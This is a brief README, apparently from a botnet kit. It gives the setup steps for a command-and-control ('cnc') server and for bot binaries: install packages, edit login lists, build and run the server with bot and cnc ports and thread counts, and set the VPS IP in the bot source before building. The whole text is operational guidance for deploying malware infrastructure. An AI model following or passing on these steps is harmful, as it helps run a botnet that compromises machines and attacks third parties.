# Requirements:
apt-get update -y
apt-get install screen -y
apt-get install gcc -y
apt-get install apache2 -y
# Steps:
- Edit users in database/logins.txt
- sh buildcnc.sh
- screen ./server <botport> <threads> <cncport>
# Bot steps
- Edit main.c in /bot directory to your bot port and vps ip
chmod 777 *
./installccs.sh
./buildbot.sh
